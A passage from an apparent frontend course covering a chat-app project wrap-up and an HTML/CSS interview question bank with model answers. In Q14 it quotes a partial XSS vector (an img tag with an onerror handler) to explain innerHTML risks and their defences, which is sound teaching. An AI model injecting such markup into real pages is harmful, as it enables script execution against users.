\u00b7 i18n \u00b7 CI pipeline and Docker deploy (Module 63) \u00b7 monitoring.\n\n### Interview questions (project-based)\n**Q1. Walk through sending a message end to end.** (Use the lifecycle diagram.) **Q2. Why optimistic updates and how do you handle failure?** **Q3. How do you auto-scroll without jank, and without yanking a user reading history?** **Q4. Why is the selected chat in the URL?** **Q5. How would you add real-time messages?** WebSocket in layout, store `receive`, cleanup. **Q6. How would you paginate message history?** cursor `before`. **Q7. How do you swap the mock API for Spring?** **Q8. How do you prevent stale search results overwriting new ones?** abort/ignore. **Q9. Where does each piece of state live and why?** **Q10. How do you secure the app?** (Module 45.)\n### Exercises\nComplete each stage yourself \u00b7 unread badge in the topbar from `unreadTotal` \u00b7 message Retry \u00b7 infinite scroll upward \u00b7 a mock WebSocket (`setInterval` pushing buyer messages, cleaned up on unmount) \u00b7 tests for `MessageComposer`, the `chat` store, and `OrderCard` \u00b7 record a 2-minute screen demo explaining the data flow (great for interviews).\n\n---\n**Next \u2192 Part 9: Interview question bank (Module 49).**\n\n\n# PART 9 \u2014 INTERVIEW PREPARATION\n\n# MODULE 49 \u2014 COMPLETE FRONTEND INTERVIEW QUESTION BANK\n\nLegend: \ud83d\udfe2 beginner \u00b7 \ud83d\udfe1 intermediate \u00b7 \ud83d\udd34 advanced \u00b7 **[OUT]** output prediction \u00b7 **[DBG]** debugging \u00b7 **[IMP]** implementation \u00b7 **[ARCH]** architecture/scenario.\nAnswer in your own words; understand **why**, don't memorise.\n\n---\n## A. HTML (Q1\u2013Q15)\n\n**Q1 \ud83d\udfe2 What is the difference between HTML elements, tags and attributes?**\nA tag is the markup (`<p>`); an element is opening tag + content + closing tag; an attribute is `name=\"value\"` metadata inside the opening tag (`<a href=\"/x\">`). Void elements (`<img>`) have no content or closing tag.\n\n**Q2 \ud83d\udfe2 What does `<!DOCTYPE html>` do?**\nIt switches the browser to standards mode. Without it browsers use quirks mode, emulating legacy rendering bugs (different box model behaviour, etc.), so layouts differ unpredictably.\n\n**Q3 \ud83d\udfe2 Why is the viewport meta tag needed?**\nMobile browsers default to a ~980px virtual layout width and scale the page down. `width=device-width, initial-scale=1` makes the layout width equal the device width, which is the prerequisite for media queries/responsive CSS to work.\n\n**Q4 \ud83d\udfe2 Semantic vs non-semantic elements, why care?**\nSemantic tags (`nav`, `main`, `article`, `button`) convey meaning, giving screen-reader landmarks, SEO signals, built-in behaviour (keyboard, focus) and readable code. `div/span` carry none, so you'd have to rebuild all of it with ARIA/JS.\n\n**Q5 \ud83d\udfe1 `<section>` vs `<article>` vs `<div>`?**\n`article` is self-contained and reusable on its own (a chat message, product card, blog post); `section` is a thematic grouping that normally has a heading; `div` is a meaningless styling wrapper. Choose by meaning, fall back to `div` when none applies.\n\n**Q6 \ud83d\udfe2 Link or button?**\nNavigation to a URL \u2192 `<a href>`. An action on the current page (submit, open modal, send) \u2192 `<button type=\"button\">`. Wrong choice breaks middle-click/open-in-new-tab or keyboard/screen-reader expectations.\n\n**Q7 \ud83d\udfe1 Why does my Cancel button submit the form?**\nA `<button>` inside a form defaults to `type=\"submit\"`. Set `type=\"button\"` for non-submitting buttons.\n\n**Q8 \ud83d\udfe1 `disabled` vs `readonly` on inputs?**\nBoth prevent editing. `disabled` removes it from tab order and **excludes it from form submission**; `readonly` is focusable and **is submitted**.\n\n**Q9 \ud83d\udfe1 What if an input has no `name`?**\nIt is not included in the submission or in `new FormData(form)`. `name` is the key; `id` is for labels/JS.\n\n**Q10 \ud83d\udfe1 GET vs POST in forms?**\nGET puts data in the URL query (bookmarkable, cached, visible in logs/history, size-limited, for reads/search); POST sends it in the body (for creating/changing data, larger payloads, files with `multipart/form-data`). Neither is \"secure\" without HTTPS.\n\n**Q11 \ud83d\udfe1 `async` vs `defer` vs normal script?**\nNormal blocks parsing during download+run. Both `async` and `defer` download in parallel; `async` runs as soon as downloaded (any order, may interrupt parsing), `defer` runs after parsing finishes, in order. `type=\"module\"` is deferred by default.\n\n**Q12 \ud83d\udfe1 Why `alt` on images? When `alt=\"\"`?**\nScreen readers read it; shown if the image fails; SEO. Decorative images get `alt=\"\"` so assistive tech skips them. Missing `alt` makes readers announce the file name.\n\n**Q13 \ud83d\udd34 What does the browser do between receiving HTML and showing pixels?**\nDecode bytes \u2192 tokenise \u2192 build DOM (error-correcting); CSS \u2192 CSSOM; DOM+CSSOM \u2192 render tree \u2192 layout \u2192 paint \u2192 composite. Scripts without `defer` block DOM building; CSS blocks rendering.\n\n**Q14 \ud83d\udd34 Why can `innerHTML` with user data be dangerous?** \nIt parses the string as HTML; attacker markup like `<img src=x onerror=\u2026>` executes JS (XSS) with the user's privileges. Use `textContent`, framework escaping, or sanitise with DOMPurify + CSP.\n\n**Q15 \ud83d\udfe1 View Source and Elements panel show different HTML. Why?**\nSource = original server response; Elements = live DOM after parser corrections and JS changes. A Vue SPA's source is just `<div id=\"app\">`.\n\n---\n## B. CSS (Q16\u2013Q40)\n\n**Q16 \ud83d\udfe2 Explain the box model.**\nEach box = content + padding + border + margin. With `content-box`, `width` is content only, so total = width + padding + border. With `border-box` (the professional reset `*{box-sizing:border-box}`), `width` includes padding and border, making sizing predictable.\n\n**Q17 \ud83d\udfe1 How does specificity work?**\nScore as (ids, classes/attributes/pseudo-classes, elements); compare left to right; inline style beats selectors; `!important` beats all; equal score \u2192 last rule wins. `:where()` adds 0. Keep specificity low (single classes) to avoid wars.\n\n**Q18 [OUT] \ud83d\udfe1 Which colour is the text?**\n```html\n<p id=\"a\" class=\"b c\">x<\/p>\n```\n```css\np{color:red} .b.c{color:green} #a{color:blue} p.b{color:orange}\n```\nBlue: id (1,0,0) beats `.b.c` (0,2,0) and `p.b` (0,1,1).\n\n**Q19 \ud83d\udfe1 Which properties inherit?**\nTypography/text ones (`color`, `font-*`, `line-height`, `text-align`, `cursor`, `visibility`) inherit; box properties (`margin`, `padding`, `border`, `background`, `width`) don't. Force with `inherit`/`initial`/`unset`.\n\n**Q20 \ud83d\udfe2 `em` vs `rem` vs `px` vs `%`?**\n`px` fixed; `em` relative to the element's (font-size: parent's) font size and compounds when nested; `rem` relative to the root font size (predictable, respects user settings), best for fonts/spacing; `%` relative to the parent's corresponding dimension.\n\n**Q21 \ud83d\udfe2 `display:none` vs `visibility:hidden` vs `opacity:0`?**\nnone: removed from layout and a11y tree. hidden: invisible but keeps space, not announced. opacity 0: invisible but keeps space, still interactive/announced (and animatable).\n\n**Q22 \ud83d\udfe1 What is margin collapsing?**\nAdjacent vertical margins of block siblings (and parent/first-child in some cases) merge into the larger one instead of adding. Doesn't occur in flex/grid containers, with padding/border separating, or for floats/absolute elements.\n\n**Q23 \ud83d\udfe1 Explain `position` values.**\nstatic (default), relative (offset from own place, creates anchor), absolute (relative to nearest positioned ancestor, removed from flow), fixed (viewport), sticky (relative until threshold then fixed within its container).\n\n**Q24 [DBG] \ud83d\udfe1 My absolutely positioned badge appears at the page corner.**\nNo ancestor is positioned, so it uses the initial containing block. Add `position: relative` to the intended parent.\n\n**Q25 \ud83d\udd34 Why does `z-index: 9999` not put my modal on top?**\nStacking contexts: the modal is inside a parent that creates a context (transform, opacity<1, filter, positioned with z-index, isolation) that sits below other content; children can't escape it. Fix by teleporting the modal to `<body>` and using a z-index scale.\n\n**Q26 \ud83d\udfe2 Flexbox vs Grid?**\nFlex is one-dimensional, content-driven (toolbars, centring, chat column); Grid is two-dimensional, layout-driven (page layouts, dashboards, card grids). Use Grid for macro layout, Flex inside components.\n\n**Q27 \ud83d\udfe1 `justify-content` vs `align-items`?**\n`justify-content` distributes along the **main** axis; `align-items` aligns along the **cross** axis. With `flex-direction: column` they swap visually.\n\n**Q28 \ud83d\udfe1 What does `flex: 1` mean?**\nShorthand `flex-grow:1; flex-shrink:1; flex-basis:0%`, so items share free space equally.\n\n**Q29 [DBG] \ud83d\udd34 Long chat text overflows a flex child instead of truncating.**\nFlex items have `min-width:auto` (content size). Add `min-width:0` (or `overflow:hidden`) on the item, then `text-overflow: ellipsis; white-space: nowrap`. Same for scrolling child in a column: `min-height:0`.\n\n**Q30 [IMP] \ud83d\udfe1 Responsive card grid without media queries.**\n`display:grid; gap:1rem; grid-template-columns:repeat(auto-fill,minmax(220px,1fr));` \u2014 creates as many \u2265220px columns as fit.\n\n**Q31 \ud83d\udfe1 `auto-fit` vs `auto-fill`?**\nBoth repeat tracks; `auto-fill` keeps empty tracks (reserving space), `auto-fit` collapses empty tracks so items stretch.\n\n**Q32 \ud83d\udfe1 Mobile-first vs desktop-first?**\nMobile-first writes base styles for small screens and adds `min-width` queries: lighter mobile CSS and progressive enhancement. Desktop-first overrides downward with `max-width`.\n\n**Q33 \ud83d\udd34 Media queries vs container queries?**\nMedia queries respond to the viewport; container queries (`@container`) respond to the size of a parent container, making components portable (same card in a narrow sidebar and wide page).\n\n**Q34 \ud83d\udfe1 What does `clamp(1rem, 2vw + .5rem, 2rem)` do?**\nFluid value: preferred middle expression bounded by min and max; used for responsive type without breakpoints.\n\n**Q35 \ud83d\udfe1 Which CSS properties are cheap to animate? Why?**\n`transform` and `opacity`: compositor-only, no layout/paint. Animating `width/top/margin` triggers reflow each frame.\n\n**Q36 \ud83d\udfe1 Reflow vs repaint?**\nReflow (layout) recomputes geometry (width/height/position changes, DOM add/remove); repaint redraws pixels (colour/shadow) without geometry. Reflow is more expensive and cascades to descendants. Avoid layout thrashing (interleaved reads/writes).\n\n**Q37 \ud83d\udfe1 CSS variables vs Sass variables?**\nCSS custom properties are runtime values that cascade/inherit and can be changed by JS and media queries (theming); Sass variables are compile-time.\n\n**Q38 \ud83d\udd34 What are cascade layers?**\n`@layer` creates ordered groups; a later layer wins over an earlier one regardless of specificity, helping control third-party CSS and design-system ordering.\n\n**Q39 \ud83d\udfe1 How does Vue `scoped` CSS work and how do you style a child?**\nThe compiler adds a `data-v-xxxx` attribute to the component's elements and rewrites select
